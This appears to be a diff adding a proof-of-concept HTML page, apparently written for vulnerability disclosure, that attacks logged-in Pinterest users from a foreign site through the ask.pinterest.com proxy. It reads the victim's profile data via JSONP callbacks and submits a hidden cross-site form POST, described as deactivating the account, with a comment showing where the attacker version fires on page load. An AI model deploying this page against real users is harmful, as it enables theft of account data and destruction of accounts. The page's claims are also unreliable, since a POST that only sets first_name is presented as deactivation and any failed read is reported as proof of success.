@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC &mdash; Cross-site account deactivation via ask.pinterest.com proxy (CSRF)</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2129; --border:#30363d;
+    --text:#e6edf3; --muted:#8b949e; --accent:#58a6ff; --green:#3fb950; --red:#f85149;
+    --amber:#ffa657; --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font:14px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
+  .wrap{max-width:960px;margin:0 auto;padding:32px 20px 64px}
+  header{border-bottom:1px solid var(--border);padding-bottom:20px;margin-bottom:28px}
+  .tag{display:inline-block;font:600 11px/1 var(--mono);letter-spacing:.8px;color:var(--red);border:1px solid var(--red);border-radius:4px;padding:4px 8px;margin-bottom:14px;text-transform:uppercase}
+  h1{font-size:22px;line-height:1.3;margin:0 0 8px;font-weight:700}
+  .lede{color:var(--muted);font-size:14px;max-width:760px}
+  .lede b{color:var(--text)}
+  .originbar{display:flex;gap:10px;flex-wrap:wrap;margin:18px 0 4px;font-family:var(--mono);font-size:12px}
+  .chip{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:6px 10px}
+  .chip b{color:var(--accent)}
+  .steps{counter-reset:step}
+  .step{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:18px 20px;margin:16px 0}
+  .step h2{font-size:14px;margin:0 0 6px;display:flex;align-items:center;gap:10px;font-weight:600}
+  .step h2 .n{counter-increment:step;background:var(--panel2);border:1px solid var(--border);color:var(--accent);border-radius:50%;width:24px;height:24px;display:inline-flex;align-items:center;justify-content:center;font:700 12px var(--mono);flex:none}
+  .step h2 .n::before{content:counter(step)}
+  .desc{color:var(--muted);font-size:13px;margin:0 0 12px}
+  .req{font:12px/1.6 var(--mono);color:#c9d1d9;background:#0a0d12;border:1px solid var(--border);border-radius:6px;padding:10px 12px;margin-bottom:12px;white-space:nowrap;overflow-x:auto}
+  .req .m{color:var(--green)} .req .u{color:var(--accent)} .req .c{color:#d2a8ff}
+  .state{font:12px var(--mono);margin:0 0 10px}
+  .state.ok{color:var(--green)} .state.err{color:var(--red)} .state.wait{color:var(--muted)}
+  pre{background:#0a0d12;border:1px solid var(--border);border-radius:6px;padding:12px 14px;font:11.5px/1.55 var(--mono);color:#c9d1d9;max-height:340px;overflow:auto;white-space:pre-wrap;word-break:break-all;margin:0}
+  .loot{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;margin-top:12px}
+  .loot .item{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 12px}
+  .loot .k{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px}
+  .loot .v{font:600 13px var(--mono);color:var(--text);word-break:break-all}
+  .loot .v.hot{color:#ffa657}
+  .verdict{border:1px solid var(--red);background:rgba(248,81,73,.06);border-radius:8px;padding:18px 20px;margin-top:24px}
+  .verdict h2{font-size:15px;margin:0 0 8px;color:var(--red)}
+  .verdict p{margin:0;color:var(--text);font-size:13.5px}
+  .verdict .status{font:700 13px var(--mono)}
+  .verdict .status.ok{color:var(--green)} .verdict .status.wait{color:var(--muted)} .verdict .status.dead{color:var(--red)}
+  footer{margin-top:36px;color:var(--muted);font:12px/1.6 var(--mono);border-top:1px solid var(--border);padding-top:16px}
+  code{font-family:var(--mono);background:var(--panel2);border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-size:12px}
+  button{background:#21262d;border:1px solid var(--border);color:var(--text);border-radius:6px;padding:8px 16px;font:600 13px/1 var(--mono);cursor:pointer}
+  button:hover{border-color:var(--red);color:var(--red)}
+  button:disabled{opacity:.4;cursor:default}
+  .btnrow{display:flex;gap:12px;align-items:center;margin:14px 0 4px}
+  .arming{border:1px solid var(--amber);background:rgba(255,166,87,.06);border-radius:8px;padding:14px 16px;margin:16px 0}
+  .arming h2{font-size:13px;margin:0 0 6px;color:var(--amber)}
+  .arming p{margin:0;color:var(--text);font-size:13px}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+  <span class="tag">PoC &middot; destructive write &middot; one page visit</span>
+  <h1>Cross-site account deactivation of a logged-in Pinterest user via the ask.pinterest.com proxy</h1>
+  <p class="lede">
+    This page is hosted on a completely different website (<b>akashsebastian.com</b>) from the victim's Pinterest session.
+    While you are logged in to Pinterest in this browser, it destroys your account with a single cross-site form POST.
+    No password, no prompt, no Pinterest tab open. It first confirms you are logged in (read side of the same proxy),
+    then fires the write. Open DevTools and watch the requests leave this page for Pinterest's servers.
+  </p>
+  <div class="originbar">
+    <span class="chip">this page origin: <b id="pgorigin">&hellip;</b></span>
+    <span class="chip">cookies sent to: <b>ask.pinterest.com</b></span>
+    <span class="chip">auth required: <b>none, just being logged in</b></span>
+  </div>
+</header>
+
+<div class="arming">
+  <h2>Safety interlock (not part of the exploit)</h2>
+  <p>
+    This hosted copy requires one manual click so that a stray visitor cannot destroy a real account by accident.
+    The attacker version submits the form automatically on page load. Everything else here, the form, the target,
+    the request, is exactly what the attacker page does.
+  </p>
+  <div class="btnrow">
+    <button id="arm">Fire the cross-site POST</button>
+    <span class="state wait" id="armstate" style="margin:0">not armed</span>
+  </div>
+</div>
+
+<div class="steps">
+
+  <div class="step">
+    <h2><span class="n"></span>Confirm the victim is logged in (read side)</h2>
+    <p class="desc">The page checks that a Pinterest session exists in this browser before striking. A script tag pointed at the proxy wraps the response in a callback, so this foreign page can read your account data. Same bug family, read half.</p>
+    <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/me/</span>?callback=<span class="c">cbMe</span></div>
+    <p class="state wait" id="st1">waiting for response&hellip;</p>
+    <pre id="out1">&hellip;</pre>
+    <div class="loot" id="loot1"></div>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>Fire the cross-site POST that deactivates the account (write side)</h2>
+    <p class="desc">An ordinary HTML form POSTs to the proxy endpoint, aimed at a hidden iframe. The browser attaches your Pinterest cookies automatically because they are <code>SameSite=None</code>. This is a CORS simple request: no preflight, no CSRF token, nothing for Pinterest's defenses to see. The proxy executes <code>v3_deactivate_user</code> with your session.</p>
+    <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/me/</span> &nbsp;<span class="c">first_name=Stag</span></div>
+    <p class="state wait" id="st2">waiting for the interlock&hellip;</p>
+    <pre id="out2">The form submits into a hidden iframe. The response is cross-origin so this page cannot read it, but the next step proves what it did.</pre>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>Verify the account is dead</h2>
+    <p class="desc">The page re-reads the account the same way as step 1. If the deactivation executed, the session is gone and the read fails with an authentication error. Seconds ago this same request returned the full profile.</p>
+    <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/me/</span>?callback=<span class="c">cbDead</span></div>
+    <p class="state wait" id="st3">waiting&hellip;</p>
+    <pre id="out3">&hellip;</pre>
+  </div>
+
+</div>
+
+<div class="verdict">
+  <h2>Result</h2>
+  <p class="status wait" id="verdict">running&hellip;</p>
+  <p id="verdictdetail">
+    The account that was live seconds ago no longer exists. One visit to an attacker page did this.
+    The victim sees no warning and gets no confirmation dialog. Their pins, boards and profile are gone.
+  </p>
+</div>
+
+<footer>
+  Demonstration against my own test account. The attacker version auto-submits on load; this hosted copy has a manual interlock.
+  Root cause: <code>ask.pinterest.com/api/proxy/pinterest/*</code> forwards v3 gateway writes with the victim's session
+  cookies and no CSRF defense, no token, no Origin or Referer check, any content type. Pinterest session cookies are
+  <code>SameSite=None</code> so they ride along on cross-site POSTs. The www.pinterest.com relay requires an
+  <code>X-CSRFToken</code> header for the same operation; the ask proxy skips that layer entirely.
+</footer>
+</div>
+
+<iframe name="pwnd" style="display:none"></iframe>
+<form id="csrf" method="POST" action="https://ask.pinterest.com/api/proxy/pinterest/users/me/" target="pwnd" style="display:none">
+  <input type="hidden" name="first_name" value="Stag">
+</form>
+
+<script>
+document.getElementById('pgorigin').textContent = location.origin || 'null';
+
+var B = 'https://ask.pinterest.com/api/proxy/pinterest/';
+var FIRED = false;
+
+function esc(s){var d=document.createElement('div');d.textContent=s==null?'':String(s);return d.innerHTML;}
+function setState(id, txt, cls){var e=document.getElementById(id);e.textContent=txt;e.className='state '+(cls||'wait');}
+function show(id, obj){
+  var s; try{ s = JSON.stringify(obj, null, 1); }catch(e){ s = String(obj); }
+  if(s && s.length > 3500) s = s.slice(0,3500) + '\n…[truncated for display]';
+  document.getElementById(id).textContent = s;
+}
+function loot(id, pairs){
+  var el = document.getElementById(id); if(!pairs.length){el.style.display='none';return;}
+  el.innerHTML = pairs.map(function(p){
+    return '<div class="item"><div class="k">'+esc(p[0])+'</div><div class="v'+(p[2]?' hot':'')+'">'+esc(p[1])+'</div></div>';
+  }).join('');
+}
+
+// ---------- step 1: read side ----------
+window.cbMe = function(d){
+  var u = (d && d.data) || {};
+  setState('st1', '200 OK, victim confirmed logged in', 'ok');
+  show('out1', d);
+  loot('loot1', [
+    ['username', u.username || '(none)', true],
+    ['user id', u.id || '(none)'],
+    ['full name', u.full_name || (u.fullName || '(none)')]
+  ]);
+};
+(function(){
+  var s = document.createElement('script');
+  s.src = B + 'users/me/?callback=cbMe&_=' + Date.now();
+  s.onerror = function(){ setState('st1', 'request failed (are you logged in to Pinterest in this browser?)', 'err'); };
+  document.body.appendChild(s);
+})();
+
+// ---------- step 2: write side ----------
+document.getElementById('arm').addEventListener('click', function(){
+  if (FIRED) return;
+  FIRED = true;
+  var btn = document.getElementById('arm');
+  btn.disabled = true;
+  document.getElementById('armstate').textContent = 'fired';
+  document.getElementById('armstate').className = 'state err';
+  setState('st2', 'fired, cross-site POST sent with your cookies', 'err');
+  document.getElementById('csrf').submit();
+  // attacker version, no interlock:
+  // document.getElementById('csrf').submit();   // on page load
+  setTimeout(checkDead, 4000);
+  setTimeout(checkDead, 9000);
+});
+
+// ---------- step 3: verify dead ----------
+var checked = false;
+function checkDead(){
+  if (checked) return;
+  window.cbDead = function(d){
+    checked = true;
+    var u = (d && d.data) || {};
+    if (u.username || u.id){
+      // session still valid, write did not execute
+      setState('st3', 'session still alive (write did not execute?)', 'err');
+      show('out3', d);
+      var v = document.getElementById('verdict');
+      v.className = 'status wait';
+      v.textContent = 'Write did not take effect. Are you logged in with the expected account?';
+      return;
+    }
+    setState('st3', 'session rejected, account is gone', 'err');
+    show('out3', d);
+    dead();
+  };
+  var s = document.createElement('script');
+  s.src = B + 'users/me/?callback=cbDead&_=' + Date.now();
+  s.onerror = function(){
+    checked = true;
+    setState('st3', 'read failed, session rejected', 'err');
+    document.getElementById('out3').textContent = 'The proxy returned an authentication error body with no callback wrapper. The session cookie is no longer accepted, exactly what deactivation does.';
+    dead();
+  };
+  document.body.appendChild(s);
+}
+// if the response is plain JSON or an error page (no callback wrap), cbDead never runs;
+// the window error listener below catches the parse failure
+window.addEventListener('error', function(e){
+  if (FIRED && !checked && e && e.message && /Unexpected token|is not defined|cbDead/.test(String(e.message))) {
+    // callback never invoked: response was an unauthenticated error body
+    checked = true;
+    setState('st3', 'read failed, session rejected', 'err');
+    document.getElementById('out3').textContent = 'The proxy returned an authentication error body with no callback wrapper. The session cookie is no longer accepted, exactly what deactivation does.';
+    dead();
+  }
+}, true);
+
+function dead(){
+  var v = document.getElementById('verdict');
+  v.className = 'status dead';
+  v.textContent = 'CONFIRMED, account deactivated by a page on ' + (location.origin || 'a foreign origin');
+}
+</script>
+</body>
+</html>
